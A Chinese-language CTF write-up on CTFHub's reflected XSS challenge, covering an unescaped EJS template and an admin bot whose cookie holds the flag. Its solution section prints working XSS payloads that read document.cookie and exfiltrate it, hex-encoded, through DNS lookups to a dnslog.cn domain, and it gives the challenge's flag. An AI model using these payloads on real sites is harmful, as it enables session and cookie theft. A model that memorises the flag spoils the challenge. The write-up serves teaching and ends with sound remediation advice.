# CTFHub Writeup - 反射型

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - 反射型 XSS（XSS Reflex） |
| 靶场地址 | `http://challenge-8a52148a385db0ed.sandbox.ctfhub.com:10800` |
| 注入位置 | GET 参数 `name` |
| 后端 | Koa + EJS，另有 Headless Chrome Bot |
| 回显位置 | `<h1>Hello, <%-name%></h1>`，未转义 |
| 获取方式 | 用 XSS 偷 Bot 浏览器里的 `flag` Cookie |
| Flag | `ctfhub{bab5f1b40161e940724f1d81}` |
## 0x02 漏洞原理
反射型 XSS 的本质是：**用户输入被原样拼进 HTML，浏览器把它当代码执行**。
本题打开首页会自动跳转到 `/?name=CTFHub`，页面把 `name` 输出到：
```
<h1>Hello, CTFHub</h1>
```
对应的模板是 `body.ejs`：
```html
<h1>Hello, <%-name%>
```
EJS 里 `<%=` 会转义，而 `<%-` 是**原样输出**，所以输入 `<script>alert(1)</script>` 会被直接写进 HTML 并执行。
但只弹个窗是拿不到 flag 的。页面下方还有一个「Send URL to Bot」功能：把 URL 提交给平台，平台用 Headless Chrome 以**管理员身份**访问这个 URL。管理员的浏览器里存着：
```
flag=ctfhub{...}
```
所以真正的目标是：构造一个恶意 URL，让 Bot 访问时执行 JS，把它的 Cookie 外带到我们能看到的地方，再从外带数据里还原 flag。
## 0x03 解题过程
**3.1 找注入点**
先访问：
```
http://challenge-8a52148a385db0ed.sandbox.ctfhub.com:10800/?name=CTFHub
```
页面回显 `Hello, CTFHub`。把 `name` 换成测试 payload：
```
/?name=<script>alert(1)</script>
```
用 curl 看响应，`<script>` 原样出现在 `<h1>Hello, <script>alert(1)</script>` 里，没有被转义，确认存在反射型 XSS。
**3.2 确认 Bot 的规则**
页面上的 Bot 入口是 `POST /submit`，页面的 JS 用 JSON 提交，但实测要用**表单编码**：
```
curl -X POST --data-urlencode "url=http://challenge-...:10800/?name=1" \
  http://challenge-...:10800/submit
```
返回：
```json
{"code": 0, "msg": "Successfully"}
```
提交非本靶场地址会返回：
```
Not Match : "/^(https?:)\/\/challenge-([0-9a-f]{16})\.sandbox\.ctfhub\.com\:10800/g"
```
说明 Bot 只访问本靶场 URL，外部地址不能直接提交——但 **XSS 执行后**发起的请求不受这个限制。
**3.3 构造偷 Cookie 的 payload**
最直接的写法：
```
<script>new Image().src='http://<收集端>/?c='+encodeURIComponent(document.cookie)</script>
```
`new Image()` 的好处是不用处理跨域，GET 请求发出去就行。
提交前要把整个 payload 做 URL 编码，再拼到 `name=` 后面，否则 Bot 拿到的 URL 里 `<`、`>` 可能被处理掉，脚本不执行。
**3.4 选择外带通道**
最方便的是 webhook.site、xssaq 这类收集平台。但本题的 Bot 在云端，实测访问 webhook.site 没有回传，于是改用国内可访问的 **DNSLog**：
- 访问 `http://www.dnslog.cn/getdomain.php` 拿一个专属域名，例如 `q8clvj.dnslog.cn`；
- 把 Cookie 编码后拼成子域名，触发 DNS 查询；
- 用同一个会话访问 `getrecords.php` 就能看到查询记录。
这里有两个坑：
- **DNS 不区分大小写**，base64 里的 `A` 和 `a` 会被归一，解出来是乱码，所以不能用 base64；
- **单个 label 最长 63 字符**，Cookie 转十六进制后超过 63，必须拆成两段。
最终 payload：
```html
<script>
var h=document.cookie.split('').map(function(c){
  return ('0'+c.charCodeAt(0).toString(16)).slice(-2)
}).join('');
new Image().src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'
</script>
```
整个 payload 经 `encodeURIComponent` 编码后，再拼成：
```
http://challenge-8a52148a385db0ed.sandbox.ctfhub.com:10800/?name=%3Cscript%3E...
```
提交给 `/submit`。
**3.5 接收并解码**
等几秒后查询 DNSLog，拿到记录：
```
666c61673d6374666875627b62616235663162343031363165.39343037323466316438317d.q8clvj.dnslog.cn
```
把两段十六进制拼起来解码：
```
flag=ctfhub{bab5f1b40161e940724f1d81}
```
得到 Flag：
```
ctfhub{bab5f1b40161e940724f1d81}
```
**3.6 验证**
- 十六进制解码后是完整的 `flag=ctfhub{...}`，没有截断；
- 同一 payload 触发了两次记录（两个出口 IP），内容一致；
- flag 长度为 32，符合 `ctfhub{` + 24 位十六进制 + `}` 的格式。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 找注入点 | `?name=<script>alert(1)</script>` | 原样输出，未转义 |
| 确认 Bot | `POST /submit` 表单 `url=...` | `code:0 Successfully` |
| 构造 payload | `new Image().src=...document.cookie` | 外带 Cookie |
| 提交 | URL 编码后交给 Bot | Bot 以管理员身份访问 |
| 接收 | DNSLog 子域名记录 | 拿到十六进制串 |
| 解码 | 十六进制转 ASCII | `flag=ctfhub{bab5f1b40161e940724f1d81}` |
整条链路可以概括为：**反射点 → 构造偷 Cookie 的脚本 → 编码后提交给 Bot → 从外带通道取回 Cookie → 解码得到 flag。**
## 0x05 踩坑记录
1. **只弹窗拿不到 flag**：`alert(1)` 只能证明存在 XSS，flag 在 Bot 的 Cookie 里，必须做数据外带。
2. **注入点在 `name`，但要先触发跳转**：直接访问首页会 302 到 `/?name=CTFHub`，测 payload 要带上 `name` 参数。
3. **Bot 只接受本靶场 URL**：提交外部地址会返回 `Not Match`，正则要求 `challenge-<16位十六进制>.sandbox.ctfhub.com:10800`。
4. **`/submit` 要用表单编码**：按页面 JS 发 JSON 会得到 `400 Bad Request`，改成 `--data-urlencode "url=..."` 才正常。
5. **payload 要先 URL 编码**：直接把 `<script>` 塞进 URL，Bot 侧可能不执行；先 `encodeURIComponent` 再拼 `name=` 才稳定。
6. **DNS 不区分大小写**：用 base64 外带会因为大小写被归一而解码失败，改用十六进制。
7. **DNS label 最长 63 字符**：Cookie 转 hex 后会超长，要拆成两个 label 分别发送。
8. **外带通道要选对**：webhook.site 在国内网络下可能不通，DNSLog 更稳；提交接口还有 5 秒限速，别连续猛点。
## 0x06 修复建议
1. **输出编码**：把 `<%- name %>` 改成 `<%= name %>`，对 `<`、`>`、`"`、`'` 做 HTML 实体编码。
2. **输入白名单**：`name` 只允许字母、数字、中文等常规字符，过滤 `<`、`>` 和事件属性。
3. **加 CSP**：设置 `Content-Security-Policy`，禁止内联脚本和外部脚本加载，能大幅降低 XSS 危害。
4. **Cookie 加 HttpOnly**：给 `flag` 这类敏感 Cookie 设置 `HttpOnly`，JS 就读不到 `document.cookie` 了。
5. **敏感 Cookie 加 SameSite**：减少跨站请求携带。
6. **Bot 侧隔离**：管理员的浏览器不要访问不可信 URL，或至少在无敏感 Cookie 的独立会话里访问。
## 0x07 总结
反射型 XSS 的利用链其实很固定：
1. 找到把用户输入原样输出到 HTML 的地方；
2. 构造能执行 JS 的 payload；
3. 用 XSS 读取 `document.cookie`，外带到自己能看到的通道；
4. 从外带数据里还原 flag。
本题的关键不在 XSS 本身，而在**外带通道**：Bot 只允许提交本靶场 URL，但脚本执行后可以访问任意地址；webhook 不通就换 DNSLog；DNS 对大小写敏感、对 label 长度有限制，就得换编码、做拆分。
防御上，输出编码是根本，CSP 和 HttpOnly 是兜底——前者让脚本注入不成立，后者让脚本即使执行也偷不到 Cookie。
